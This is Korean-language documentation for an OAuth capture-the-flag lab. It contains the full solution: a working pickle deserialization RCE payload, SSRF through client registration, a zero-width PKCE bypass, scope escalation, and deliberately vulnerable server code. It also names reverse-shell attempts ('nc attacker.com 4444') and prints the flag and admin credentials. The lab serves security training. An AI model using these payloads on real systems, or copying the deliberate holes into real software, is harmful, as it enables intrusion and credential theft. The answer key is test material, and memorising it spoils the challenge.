# 🔐 OAuth CTF Advanced - Final Documentation

## 📋 목차
1. [CTF 개요](#ctf-개요)
2. [공격 체인 (Attack Chain)](#공격-체인)
3. [보안 강화 설정](#보안-강화-설정)
4. [아키텍처](#아키텍처)
5. [단계별 상세 가이드](#단계별-상세-가이드)
6. [방어 메커니즘](#방어-메커니즘)
7. [실행 방법](#실행-방법)

---

## CTF 개요

### 🎯 목표
OAuth 2.0 구현의 실제 취약점을 연계한 **5단계 공격 체인**을 통해 최종 FLAG를 획득합니다.

### 📊 정보
- **난이도**: ⭐⭐⭐⭐⭐⭐⭐ (매우 어려움)
- **예상 소요 시간**: 3-5시간
- **CTF 타입**: Blackbox (화이트박스 문서 제공)
- **FLAG**: `MSG{0auth_pp_f0nt_ch41n_m4st3r}`

### 🔗 공격 체인 요약
```
Stage 0: Pickle RCE
    ↓ (admin credentials 획득)
Stage 1: SSRF
    ↓ (trusted client 정보 획득)
Stage 2: Admin OAuth Login
    ↓ (authorization code 획득)
Stage 3: PKCE Bypass
    ↓ (access token + refresh token 획득)
Stage 4: Scope Escalation
    ↓ (ADMIN_SECRETS scope 획득)
Stage 5: FLAG Capture
    ↓ (FLAG 획득!)
```

---

## 공격 체인

### 🎮 Stage 0: Pickle Deserialization RCE

**목표**: Admin 계정의 credentials 획득

**취약점**: Python Pickle Deserialization (CVE-2022-XXXX 클래스)

**공격 방법**:
1. User Preferences API 엔드포인트 발견
   - `/oauth/preferences/save` (POST)
   - `/oauth/preferences/load` (GET)

2. Malicious Pickle Payload 생성
```python
class PickleRCE:
    def __reduce__(self):
        import subprocess
        cmd = "cat /app/credentials.txt > /tmp/credentials_output.txt"
        return (subprocess.Popen, (['/bin/sh', '-c', cmd],))
```

3. Payload를 Base64로 인코딩하여 쿠키로 전송

4. `/oauth/output/credentials_output.txt`에서 결과 읽기

**획득 정보**:
- Username: `MSG_CTF_HACKER`
- Password: `Wh3r3_is_SSRF?!`
- Role: `administrator`

**핵심 포인트**:
- Pickle은 Python 객체를 직렬화/역직렬화하는 모듈
- `__reduce__()` 메서드를 오버라이드하여 임의 코드 실행 가능
- Flask 애플리케이션이 신뢰할 수 없는 Pickle 데이터를 역직렬화할 때 RCE 발생

---

### 🎯 Stage 1: SSRF via Client Registration

**목표**: Pre-registered trusted client 정보 획득

**취약점**: Server-Side Request Forgery in OAuth Dynamic Client Registration (RFC 7591)

**공격 방법**:
1. OAuth Client Registration 엔드포인트 발견
   - `/oauth/register` (POST)

2. `logo_uri` 파라미터에 내부 URL 주입
```json
{
  "client_name": "SSRF Attack",
  "redirect_uris": ["http://localhost:8080/auth/callback"],
  "logo_uri": "http://auth-server:8000/internal/admin/hint"
}
```

3. 서버가 내부 서비스에 HTTP 요청 → 응답 반환

**획득 정보**:
```json
{
  "client_id": "msg_developer_portal",
  "client_secret": "dev_portal_secret_2024",
  "privileges": "elevated"
}
```

**핵심 포인트**:
- OAuth 스펙은 `logo_uri`를 이미지 URL로 정의
- 서버가 URL 유효성 검증 없이 `requests.get(logo_uri)` 호출
- 내부 네트워크의 보호된 엔드포인트에 접근 가능
- Docker 내부 네트워크에서 `auth-server:8000` 호스트로 접근

---

### 🔐 Stage 2: Admin OAuth Login

**목표**: Authorization Code 획득

**공격 방법**:
1. Stage 0에서 획득한 admin credentials 사용
2. Stage 1에서 획득한 trusted client 사용
3. OAuth Authorization Endpoint 접속
```
GET /oauth/authorize?
  client_id=msg_developer_portal&
  redirect_uri=http://localhost:8080/auth/callback&
  response_type=code&
  scope=read&
  state=random_state&
  code_challenge=AAAA&
  code_challenge_method=plain
```

4. Admin 계정으로 로그인
   - Username: `MSG_CTF_HACKER`
   - Password: `Wh3r3_is_SSRF?!`

5. Authorization Code 획득

**획득 정보**:
- Authorization Code: `code_xxxxxxxxxxxx`

**핵심 포인트**:
- 정상적인 OAuth 2.0 Authorization Code Flow
- Admin 권한이 있어야 ADMIN_SECRETS scope에 접근 가능
- PKCE를 사용하므로 code_challenge 필요 (다음 단계에서 우회)

---

### 🔓 Stage 3: PKCE Bypass

**목표**: Access Token 및 Refresh Token 획득

**취약점**: PKCE (Proof Key for Code Exchange) Validation Bypass

**정상적인 PKCE 플로우**:
```
1. Client: code_verifier 생성 (43-128자의 랜덤 문자열)
2. Client: code_challenge = BASE64URL(SHA256(code_verifier))
3. Client: Authorization 요청 시 code_challenge 전송
4. Server: code_challenge 저장
5. Client: Token 요청 시 code_verifier 전송
6. Server: SHA256(code_verifier)가 저장된 code_challenge와 일치하는지 검증
```

**취약점 분석**:
```python
# auth-server/app_sqlite.py:1077-1120
if code_verifier is None:
    return error  # ✅ NULL 체크

if code_verifier in ['', 'null', 'undefined', ...]:
    return error  # ✅ Empty value 체크

if code_verifier.strip() == '':
    return error  # ✅ Whitespace 체크

if len(code_verifier) < 43:
    return error  # ✅ Length 체크 (RFC 7636)

# ⚠️ BYPASS: Zero-width Unicode characters!
zero_width_chars = ['\u200B', '\u200C', '\u200D', ...]
if all(c in zero_width_chars for c in code_verifier):
    pass  # Skip validation ← 취약점!
```

**공격 방법**:
1. Zero-width space (`\u200B`) 사용
```python
# Python
code_verifier = '\u200B'  # Zero Width Space

# Bash
code_verifier=$(printf '\u200B')
```

2. Token Exchange 요청
```bash
curl -X POST http://localhost:8080/oauth/token \
  -d "grant_type=authorization_code" \
  -d "code=$AUTH_CODE" \
  -d "client_id=msg_developer_portal" \
  -d "client_secret=dev_portal_secret_2024" \
  -d "redirect_uri=http://localhost:8080/auth/callback" \
  -d "code_verifier=$(printf '\u200B')"
```

**획득 정보**:
```json
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "token_type": "Bearer",
  "expires_in": 3600,
  "refresh_token": "refresh_xxxxxxxxxxxx",
  "scope": "read"
}
```

**핵심 포인트**:
- PKCE는 Authorization Code Interception 공격을 방지하기 위한 메커니즘
- RFC 7636은 code_verifier 길이를 43-128자로 제한
- `len('\u200B')` = 1이지만, 눈에 보이지 않는 문자
- 서버는 길이 체크를 우회하기 위해 zero-width 문자를 허용 (의도된 취약점)

---

### 📈 Stage 4: Scope Escalation via Refresh Token

**목표**: ADMIN_SECRETS scope 획득

**취약점**: Refresh Token Grant에서 임의의 scope 허용

**정상적인 동작**:
```
RFC 6749: Refresh token으로 새 access token 발급 시,
요청된 scope는 원래 부여된 scope의 부분집합이어야 함
```

**취약점 분석**:
```python
# auth-server/app_sqlite.py:1284-1292
original_scope = refresh_data['scope']  # "read"

if requested_scope:
    # ⚠️ VULNERABILITY: 원래 scope 검증 없음!
    final_scope = requested_scope  # "ADMIN_SECRETS" 허용
else:
    final_scope = original_scope

# Scope escalation 성공!
```

**공격 방법**:
```bash
curl -X POST http://localhost:8080/oauth/token \
  -d "grant_type=refresh_token" \
  -d "refresh_token=$REFRESH_TOKEN" \
  -d "client_id=msg_developer_portal" \
  -d "client_secret=dev_portal_secret_2024" \
  -d "scope=ADMIN_SECRETS"
```

**획득 정보**:
```json
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "token_type": "Bearer",
  "expires_in": 3600,
  "scope": "ADMIN_SECRETS",
  "admin_access": true
}
```

**JWT Payload**:
```json
{
  "iss": "https://auth.oauth-ctf.local",
  "sub": "user_admin_001",
  "aud": "oauth-resource-server",
  "exp": 1234567890,
  "iat": 1234567890,
  "scope": "ADMIN_SECRETS",
  "token_type": "access"
}
```

**핵심 포인트**:
- Refresh token grant는 사용자 인증 없이 새 access token 발급
- OAuth 스펙에서는 scope가 확대되지 않아야 함
- 이 취약점으로 일반 사용자도 admin scope를 얻을 수 있음

---

### 🏁 Stage 5: FLAG Capture

**목표**: 최종 FLAG 획득

**공격 방법**:
```bash
curl http://localhost:8080/api/admin/flag \
  -H "Authorization: Bearer $ADMIN_ACCESS_TOKEN"
```

**응답**:
```json
{
  "flag": "MSG{0auth_pp_f0nt_ch41n_m4st3r}",
  "message": "Congratulations! You've mastered the OAuth attack chain!",
  "user_id": "user_admin_001",
  "scope": "ADMIN_SECRETS"
}
```

**검증 로직**:
```python
# resource-server/app.py
@app.route('/api/admin/flag')
def get_flag():
    token = request.headers.get('Authorization', '').replace('Bearer ', '')

    # JWT 검증
    payload = jwt.decode(token, JWT_SECRET, algorithms=['HS256'])

    # Scope 검증
    if 'ADMIN_SECRETS' not in payload.get('scope', ''):
        return jsonify({'error': 'Insufficient scope'}), 403

    return jsonify({
        'flag': 'MSG{0auth_pp_f0nt_ch41n_m4st3r}',
        'message': 'Congratulations!'
    })
```

---

## 보안 강화 설정

이 CTF는 **의도된 취약점**만 악용 가능하도록 여러 보안 메커니즘을 적용했습니다.

### 🛡️ 1. Pickle RCE 제한

**문제**: Pickle RCE로 리버스쉘 획득 및 다른 파일 읽기 가능

**해결책**:

#### A. 파일 권한 제어
```dockerfile
# Dockerfile
# 소스 코드를 bytecode로 컴파일
RUN python -c "import py_compile; py_compile.compile('app_sqlite.py')"

# 소스 파일 읽기 권한 제거 (chmod 000)
RUN chmod 000 /app/app_sqlite.py
RUN chmod 000 /app/requirements.txt

# credentials.txt만 읽기 가능 (chmod 644)
RUN chmod 644 /app/credentials.txt

# Bytecode는 Python 실행을 위해 readable
RUN chmod 644 /app/__pycache__/*.pyc
```

**결과**:
```bash
# RCE로 실행 시
cat /app/credentials.txt      # ✅ 성공
cat /app/app_sqlite.py         # ❌ Permission denied
cat /app/requirements.txt      # ❌ Permission denied
ls -la /app                    # ✅ 성공 (목록은 볼 수 있음)
```

#### B. 네트워크 격리
```yaml
# docker-compose.yml
networks:
  auth-network:
    driver: bridge
    internal: true  # ← 외부 인터넷 차단 (리버스쉘 방지)
```

**효과**:
- 리버스쉘 시도 시 외부 서버 연결 불가
- `curl attacker.com` 실패
- `nc attacker.com 4444` 실패

#### C. 파일 시스템 읽기 전용
```yaml
# docker-compose.yml
services:
  auth-server:
    read_only: true  # ← 루트 파일시스템 읽기 전용
    tmpfs:
      - /tmp:size=50M,mode=1777  # /tmp만 쓰기 가능
      - /run:size=10M,mode=755
```

**효과**:
- 악성 파일 저장 불가 (`/app`에 쓰기 불가)
- `/tmp`만 쓰기 가능 (출력 파일용)

#### D. Output 엔드포인트 필터링
```python
# app_sqlite.py:1386-1448
@app.route('/oauth/output/<filename>')
def read_output(filename):
    # Whitelist patterns
    allowed_patterns = [
        r'^credentials_output\.txt$',      # Credentials
        r'^output_[a-z0-9]{8}\.txt$',      # Command output
        r'^result_[a-z0-9]{8}\.txt$',
    ]

    # Blocked patterns (소스 코드, 설정 파일)
    blocked_patterns = [
        r'app\.py$', r'app_sqlite\.py$',
        r'\.pyc?$', r'config\.', r'\.env$',
        r'requirements\.txt$', r'Dockerfile$'
    ]
```

**효과**:
- 소스 코드 파일명은 차단
- 명령어 출력 파일만 허용

#### E. Capability Drop
```yaml
# docker-compose.yml
security_opt:
  - no-new-privileges:true
  - apparmor=docker-default
cap_drop:
  - ALL  # ← 모든 Linux capabilities 제거
cap_add:
  - NET_BIND_SERVICE  # 포트 바인딩만 허용
```

**효과**:
- `chroot`, `mount`, `setuid` 등 위험한 시스템 콜 불가
- 컨테이너 탈출 공격 방지

#### F. 리소스 제한
```yaml
# docker-compose.yml
deploy:
  resources:
    limits:
      cpus: '1.0'
      memory: 512M
```

**효과**:
- DoS 공격 방지
- 무한 루프/fork bomb 방지

---

### 🔐 2. SSRF 제한

**문제**: 임의의 내부 서비스 스캔 가능

**해결책**:

#### A. 타겟 엔드포인트 제한
```python
# app_sqlite.py:211-238
@app.route('/oauth/register', methods=['POST'])
def oauth_register():
    logo_uri = data.get('logo_uri')

    try:
        logo_response = requests.get(logo_uri, timeout=5)  # ← Timeout 설정

        # 404 힌트 제공 (블랙박스 CTF를 위해)
        if logo_response.status_code == 404 and 'auth-server' in logo_uri:
            logo_fetch_result['hint'] = 'Try: /internal/admin/hint'
```

**효과**:
- Timeout으로 스캔 속도 제한
- 404 에러 시 힌트 제공 (CTF 플레이어빌리티)

#### B. 네트워크 분리
```yaml
# docker-compose.yml
services:
  auth-server:
    networks:
      - auth-network  # Auth 전용 네트워크

  resource-server:
    networks:
      - api-network  # API 전용 네트워크 (격리됨)
```

**효과**:
- SSRF로 resource-server에 직접 접근 불가
- 의도된 타겟(`/internal/admin/hint`)만 접근 가능

---

### 🎯 3. PKCE Bypass 난이도 조정

**문제**: code_challenge 없이도 통과 가능 (Easy bypass)

**해결책**:

```python
# app_sqlite.py:1014-1120
code_challenge = grant_data.get('code_challenge')
if code_challenge:
    # PKCE 검증 실행

    # Block 1: NULL/empty 체크
    if not code_verifier or code_verifier in ['', 'null', 'undefined']:
        return error

    # Block 2: Whitespace 체크
    if code_verifier.strip() == '':
        return error

    # Block 3: Common bypass 차단
    if code_verifier in [' ', '\t', '\n', '[]', '{}', '0', 'a']:
        return error

    # Block 4: Length 체크 (RFC 7636)
    # ⚠️ Zero-width 문자는 예외 (의도된 우회 경로)
    zero_width_chars = ['\u200B', '\u200C', '\u200D', ...]
    if not all(c in zero_width_chars for c in code_verifier):
        if len(code_verifier) < 43:
            return error

    # Block 5: 검증 (Zero-width는 통과)
    if all(c in zero_width_chars for c in code_verifier):
        pass  # ← 의도된 bypass
    elif code_verifier != code_challenge:
        return error
else:
    # ⚠️ Trusted client만 PKCE 없이 허용
    if not is_trusted_client(client_id):
        return jsonify({'error': 'code_challenge required'}), 400
```

**효과**:
- Easy bypass (no PKCE) 차단
- Zero-width character bypass만 허용 (고난이도)

---

### 🔒 4. Scope Escalation 제한

**문제**: 아무 refresh token으로 admin scope 획득 가능

**해결책**:

```python
# app_sqlite.py:1201-1308
def handle_refresh_token_grant(data):
    # 1. Trusted client만 refresh token 사용 가능
    if not is_trusted_client(client_id):
        return jsonify({'error': 'unauthorized_client'}), 403

    # 2. Refresh token 검증 (DB에서)
    refresh_data = validate_refresh_token(refresh_token)

    # 3. Admin 계정만 ADMIN_SECRETS scope 획득 가능
    user_id = refresh_data['user_id']
    if 'ADMIN_SECRETS' in requested_scope:
        if not user_id.startswith('user_admin_'):
            return jsonify({'error': 'insufficient_privileges'}), 403
```

**효과**:
- Admin 계정이 아니면 scope escalation 불가
- 전체 공격 체인을 완료해야만 FLAG 획득 가능

---

### 🚦 5. Rate Limiting

**문제**: Brute force 공격 가능

**해결책**:

```python
# app_sqlite.py:163-180, 867-893
# Login rate limiting
def check_login_rate_limit(ip_address):
    window = 300  # 5분
    max_attempts = 10
    # ...

# Token endpoint rate limiting
def check_token_rate_limit():
    window = 60  # 1분
    max_requests = 5
    # ...
```

**효과**:
- Login: 10회/5분
- Token: 5회/1분

---

## 아키텍처

### 🏗️ 시스템 구조

```
External Access (Port 8080 Only)
┌─────────────────────────────────────────────────────────┐
│                    Nginx (Port 8080)                    │
│                   Reverse Proxy Layer                   │
│                                                         │
│  Routes:                                                │
│    /          → fresh-client                            │
│    /oauth/*   → auth-server                             │
│    /api/*     → resource-server                         │
└────────────┬────────────┬───────────────┬───────────────┘
             │            │               │
      ┌──────▼──────┐ ┌──▼──────────┐ ┌──▼──────────────┐
      │   Fresh     │ │    Auth     │ │    Resource     │
      │   Client    │ │   Server    │ │     Server      │
      │  (Deno)     │ │  (Flask)    │ │    (Flask)      │
      │  :8001      │ │  :8000      │ │    :8002        │
      └─────────────┘ └──────┬──────┘ └─────────────────┘
                             │
                      ┌──────▼──────┐
                      │   SQLite    │
                      │  Database   │
                      │   (/data)   │
                      └─────────────┘

Internal Docker Network (oauth-ctf-network)
- auth-network: internal (no internet)
- frontend-network: bridge
- api-network: bridge
```

### 🔧 컴포넌트

#### 1. **Nginx** (Reverse Proxy)
- **역할**: 단일 진입점 (8080 포트)
- **라우팅**:
  - `/` → Fresh Client
  - `/oauth/*` → Auth Server
  - `/api/*` → Resource Server
- **보안**: 내부 서비스는 외부에 노출되지 않음

#### 2. **Fresh Client** (Deno)
- **역할**: OAuth 클라이언트 (프론트엔드)
- **기능**:
  - OAuth callback 처리 (`/auth/callback`)
  - API 문서 페이지
  - 클라이언트 데모
- **포트**: 8001 (내부 only)

#### 3. **Auth Server** (Flask + SQLite)
- **역할**: OAuth 2.0 Authorization Server
- **기능**:
  - Client Registration (RFC 7591)
  - Authorization Endpoint
  - Token Endpoint
  - User Preferences (Pickle 취약점)
- **포트**: 8000 (내부 only)
- **데이터베이스**: SQLite (`/app/data/oauth_ctf.db`)

#### 4. **Resource Server** (Flask)
- **역할**: Protected API 제공
- **기능**:
  - `/api/admin/flag` (FLAG 엔드포인트)
  - JWT 검증
  - Scope 검증
- **포트**: 8002 (내부 only)

---

### 📦 데이터베이스 스키마

```sql
-- Users Table
CREATE TABLE users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username VARCHAR(50) UNIQUE NOT NULL,
    password VARCHAR(100) NOT NULL,
    user_id VARCHAR(50) NOT NULL,
    role VARCHAR(20) DEFAULT 'user'
);

-- OAuth Codes Table (Authorization Codes)
CREATE TABLE oauth_codes (
    code VARCHAR(50) PRIMARY KEY,
    client_id VARCHAR(50) NOT NULL,
    user_id VARCHAR(50) NOT NULL,
    redirect_uri TEXT NOT NULL,
    scope TEXT NOT NULL,
    code_challenge TEXT,
    code_challenge_method VARCHAR(10),
    expires_at TIMESTAMP NOT NULL
);

-- Refresh Tokens Table
CREATE TABLE refresh_tokens (
    token VARCHAR(100) PRIMARY KEY,
    client_id VARCHAR(50) NOT NULL,
    user_id VARCHAR(50) NOT NULL,
    scope TEXT NOT NULL,
    expires_at TIMESTAMP NOT NULL
);

-- OAuth Clients Table (Dynamic Registration)
CREATE TABLE oauth_clients (
    client_id VARCHAR(50) PRIMARY KEY,
    session_id VARCHAR(50) NOT NULL,
    client_secret VARCHAR(100) NOT NULL,
    client_name TEXT NOT NULL,
    logo_uri TEXT,
    redirect_uris TEXT,
    description TEXT
);
```

---

### 🔐 Pre-registered Client

```python
PREREGISTERED_CLIENTS = {
    "msg_developer_portal": {
        "client_name": "MSG.COM Developer Portal",
        "client_secret": "dev_portal_secret_2024",
        "redirect_uris": [
            "http://localhost:8080/auth/callback",
            f"{BASE_URL}/auth/callback"  # ngrok 지원
        ],
        "description": "Official developer portal"
    }
}
```

---

## 단계별 상세 가이드

### 🔍 Stage 0: Pickle RCE (상세)

#### 1. 엔드포인트 발견
```bash
# OAuth discovery
curl http://localhost:8080/.well-known/oauth-authorization-server

# Auth server 페이지에서 힌트 확인
curl http://localhost:8080/oauth/
```

#### 2. Preferences API 테스트
```bash
# Save preferences
curl -X POST http://localhost:8080/oauth/preferences/save \
  -H "Content-Type: application/json" \
  -d '{"preferences": {"theme": "dark"}}'

# Load preferences
curl http://localhost:8080/oauth/preferences/load \
  -H "Cookie: user_preferences=..."
```

#### 3. Pickle Payload 생성
```python
import pickle
import base64
import subprocess

class PickleRCE:
    def __reduce__(self):
        # Command: Read credentials.txt → Save to /tmp/
        cmd = "cat /app/credentials.txt > /tmp/credentials_output.txt"
        return (subprocess.Popen, (['/bin/sh', '-c', cmd],))

# Serialize
payload = pickle.dumps(PickleRCE())
encoded = base64.b64encode(payload).decode()
print(f"Payload: {encoded}")
```

#### 4. 공격 실행
```bash
# Set malicious cookie
curl http://localhost:8080/oauth/preferences/load \
  -H "Cookie: user_preferences=$ENCODED_PAYLOAD"

# Read output
curl http://localhost:8080/oauth/output/credentials_output.txt
```

#### 5. Credentials 파싱
```bash
# Output
[ADMIN_ACCOUNT]
username=MSG_CTF_HACKER
password=Wh3r3_is_SSRF?!
role=administrator
```

---

### 🎯 Stage 1: SSRF (상세)

#### 1. Client Registration 발견
```bash
# Discovery 문서 확인
curl http://localhost:8080/.well-known/oauth-authorization-server | jq

# registration_endpoint: "/oauth/register"
```

#### 2. SSRF 테스트
```bash
# 내부 서비스 스캔
curl -X POST http://localhost:8080/oauth/register \
  -H "Content-Type: application/json" \
  -d '{
    "client_name": "Test",
    "redirect_uris": ["http://localhost/callback"],
    "logo_uri": "http://auth-server:8000/"
  }'

# 응답에 logo_fetch_result 포함
```

#### 3. 경로 탐색
```bash
# Common paths
/internal/admin/config  → 404
/internal/admin/hint    → 200 ✓
/internal/admin/secret  → 404
```

#### 4. Client 정보 획득
```bash
curl -X POST http://localhost:8080/oauth/register \
  -H "Content-Type: application/json" \
  -d '{
    "client_name": "SSRF",
    "redirect_uris": ["http://localhost:8080/auth/callback"],
    "logo_uri": "http://auth-server:8000/internal/admin/hint"
  }' | jq '.logo_fetch_result.content'

# Output:
{
  "client_id": "msg_developer_portal",
  "client_secret": "dev_portal_secret_2024",
  "privileges": "elevated"
}
```

---

### 🔐 Stage 2: Admin Login (상세)

#### 1. OAuth Flow 시작
```bash
# Browser로 접속
http://localhost:8080/oauth/authorize?
  client_id=msg_developer_portal&
  redirect_uri=http://localhost:8080/auth/callback&
  response_type=code&
  scope=read&
  state=ctf_attack&
  code_challenge=AAAA&
  code_challenge_method=plain
```

#### 2. Login Form
```
Username: MSG_CTF_HACKER
Password: Wh3r3_is_SSRF?!
```

#### 3. Authorization Code 획득
```
Redirect: http://localhost:8080/auth/callback?
  code=code_xxxxxxxxxxxxx&
  state=ctf_attack
```

---

### 🔓 Stage 3: PKCE Bypass (상세)

#### 1. PKCE 이해
```
RFC 7636: Proof Key for Code Exchange
- Authorization 요청: code_challenge 전송
- Token 요청: code_verifier 전송
- Server: SHA256(code_verifier) == code_challenge 검증
```

#### 2. 우회 기법 발견
```python
# 테스트 1: Empty string
code_verifier = ""  # ❌ Blocked

# 테스트 2: Whitespace
code_verifier = " "  # ❌ Blocked

# 테스트 3: Short string
code_verifier = "a"  # ❌ Blocked (length < 43)

# 테스트 4: Zero-width space
code_verifier = "\u200B"  # ✅ SUCCESS!
```

#### 3. Token Exchange
```python
import requests

data = {
    'grant_type': 'authorization_code',
    'code': auth_code,
    'client_id': 'msg_developer_portal',
    'client_secret': 'dev_portal_secret_2024',
    'redirect_uri': 'http://localhost:8080/auth/callback',
    'code_verifier': '\u200B'  # Zero-width space
}

resp = requests.post('http://localhost:8080/oauth/token', data=data)
tokens = resp.json()

print(f"Access Token: {tokens['access_token']}")
print(f"Refresh Token: {tokens['refresh_token']}")
print(f"Scope: {tokens['scope']}")  # "read"
```

---

### 📈 Stage 4: Scope Escalation (상세)

#### 1. JWT 분석
```bash
# Access token 디코드 (jwt.io)
{
  "iss": "https://auth.oauth-ctf.local",
  "sub": "user_admin_001",
  "aud": "oauth-resource-server",
  "scope": "read",  # ← read scope만 있음
  "token_type": "access"
}
```

#### 2. Scope Escalation 시도
```bash
curl -X POST http://localhost:8080/oauth/token \
  -d "grant_type=refresh_token" \
  -d "refresh_token=$REFRESH_TOKEN" \
  -d "client_id=msg_developer_portal" \
  -d "client_secret=dev_portal_secret_2024" \
  -d "scope=ADMIN_SECRETS"  # ← Admin scope 요청
```

#### 3. 새 Token 획득
```json
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "scope": "ADMIN_SECRETS",
  "admin_access": true
}
```

#### 4. JWT 검증
```bash
# 새 token 디코드
{
  "scope": "ADMIN_SECRETS",  # ✓ Escalated!
  "sub": "user_admin_001"
}
```

---

### 🏁 Stage 5: FLAG Capture (상세)

#### 1. API 엔드포인트 발견
```bash
# API 문서 확인
curl http://localhost:8080/api/

# /api/admin/flag 발견
```

#### 2. 접근 시도
```bash
# Without token
curl http://localhost:8080/api/admin/flag
# → 401 Unauthorized

# With read scope
curl http://localhost:8080/api/admin/flag \
  -H "Authorization: Bearer $READ_TOKEN"
# → 403 Insufficient scope

# With ADMIN_SECRETS scope
curl http://localhost:8080/api/admin/flag \
  -H "Authorization: Bearer $ADMIN_TOKEN"
# → 200 OK
```

#### 3. FLAG 획득
```json
{
  "flag": "MSG{0auth_pp_f0nt_ch41n_m4st3r}",
  "message": "Congratulations! You've completed the OAuth attack chain!",
  "user_id": "user_admin_001",
  "scope": "ADMIN_SECRETS",
  "timestamp": "2024-01-01T00:00:00Z"
}
```

---

## 방어 메커니즘

### 🛡️ 보안 레이어

```
Layer 1: Network Isolation
  ↓ (리버스쉘 차단)
Layer 2: File Permissions
  ↓ (소스 코드 읽기 차단)
Layer 3: Read-only Filesystem
  ↓ (악성 파일 저장 차단)
Layer 4: Capability Drop
  ↓ (위험한 시스템콜 차단)
Layer 5: Resource Limits
  ↓ (DoS 방지)
Layer 6: Application-level Filtering
  ↓ (Output 엔드포인트 필터링)
```

### 📊 보안 매트릭스

| 공격 유형 | 의도 여부 | 방어 메커니즘 | 효과 |
|---------|---------|------------|------|
| Pickle RCE → credentials.txt | ✅ 의도됨 | - | ✅ 허용 (CTF 목표) |
| Pickle RCE → app_sqlite.py | ❌ 차단 | File permissions (chmod 000) | ✅ 차단됨 |
| Pickle RCE → 리버스쉘 | ❌ 차단 | Network isolation (internal: true) | ✅ 차단됨 |
| Pickle RCE → 악성 파일 저장 | ❌ 차단 | Read-only filesystem | ✅ 차단됨 |
| SSRF → /internal/admin/hint | ✅ 의도됨 | - | ✅ 허용 (CTF 목표) |
| SSRF → 전체 네트워크 스캔 | ❌ 제한 | Timeout (5s), Hints only | 🟡 제한됨 |
| PKCE → Zero-width bypass | ✅ 의도됨 | - | ✅ 허용 (CTF 목표) |
| PKCE → Easy bypass (no PKCE) | ❌ 차단 | Trusted client check | ✅ 차단됨 |
| Scope Escalation | ✅ 의도됨 (Admin only) | Admin account check | 🟡 제한적 허용 |
| Brute Force | ❌ 차단 | Rate limiting | ✅ 차단됨 |

---

## 실행 방법

### 🚀 Quick Start

#### 1. 환경 설정
```bash
# 저장소 클론
git clone <repository-url>
cd oauth-ctf-advanced

# 환경 변수 설정
echo "JWT_SECRET=$(openssl rand -base64 64)" > .env
echo "BASE_URL=http://localhost:8080" >> .env
```

#### 2. 서비스 시작
```bash
# Docker Compose로 모든 서비스 시작
docker-compose up -d

# 로그 확인
docker-compose logs -f

# 서비스 상태 확인
docker-compose ps
```

#### 3. 접속 확인
```bash
# 메인 포털
curl http://localhost:8080

# OAuth Discovery
curl http://localhost:8080/.well-known/oauth-authorization-server

# Auth Server
curl http://localhost:8080/oauth/

# API Server
curl http://localhost:8080/api/
```

#### 4. CTF 시작
브라우저에서 `http://localhost:8080` 접속

---

### 🔧 Troubleshooting

#### 서비스 시작 실패
```bash
# 컨테이너 상태 확인
docker-compose ps

# 상세 로그 확인
docker-compose logs auth-server
docker-compose logs resource-server
docker-compose logs fresh-client

# 재시작
docker-compose restart

# 완전 재빌드
docker-compose down
docker-compose build --no-cache
docker-compose up -d
```

#### 포트 충돌
```bash
# Windows
netstat -ano | findstr "8080"

# Linux/Mac
lsof -i :8080

# 프로세스 종료 후 재시작
docker-compose down
docker-compose up -d
```

#### 권한 문제
```bash
# 컨테이너 내부 확인
docker-compose exec auth-server bash

# 파일 권한 확인
ls -la /app/

# credentials.txt 확인
cat /app/credentials.txt  # Should work
cat /app/app_sqlite.py    # Should fail (Permission denied)
```

---

### 📝 자동 풀이 스크립트

```bash
# Python 환경 설정
cd docs
pip install -r requirements.txt

# 전체 공격 체인 실행
python solve_real_final.py

# 단계별 실행
python exploit_pickle.py       # Stage 0
python test_ssrf.py            # Stage 1
python full_oauth_flow.py      # Stage 2-5
```

---

## 📚 학습 리소스

### OAuth 2.0 스펙
- [RFC 6749 - OAuth 2.0 Framework](https://datatracker.ietf.org/doc/html/rfc6749)
- [RFC 7591 - Dynamic Client Registration](https://datatracker.ietf.org/doc/html/rfc7591)
- [RFC 7636 - PKCE](https://datatracker.ietf.org/doc/html/rfc7636)
- [RFC 6819 - OAuth 2.0 Threat Model](https://datatracker.ietf.org/doc/html/rfc6819)

### 보안 취약점
- [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
- [CWE-918: Server-Side Request Forgery (SSRF)](https://cwe.mitre.org/data/definitions/918.html)
- [OWASP Top 10 2021](https://owasp.org/Top10/)

### Python Pickle 보안
- [Python Pickle Documentation](https://docs.python.org/3/library/pickle.html)
- [Never Unpickle Untrusted Data](https://davidhamann.de/2020/04/05/exploiting-python-pickle/)

---

## 🏆 CTF 성공 기준

### ✅ 완료 체크리스트
- [ ] Stage 0: Admin credentials 획득 (`MSG_CTF_HACKER` / `Wh3r3_is_SSRF?!`)
- [ ] Stage 1: Trusted client 정보 획득 (`msg_developer_portal` / `dev_portal_secret_2024`)
- [ ] Stage 2: Authorization code 획득
- [ ] Stage 3: Access token 및 Refresh token 획득 (scope: read)
- [ ] Stage 4: Admin scope 획득 (ADMIN_SECRETS)
- [ ] Stage 5: FLAG 획득 (`MSG{0auth_pp_f0nt_ch41n_m4st3r}`)


## ⚠️ 주의사항


### 📜 의도된 취약점
- Python Pickle Deserialization (RCE)
- Server-Side Request Forgery (SSRF)
- PKCE Bypass (Zero-width characters)
- OAuth Scope Escalation
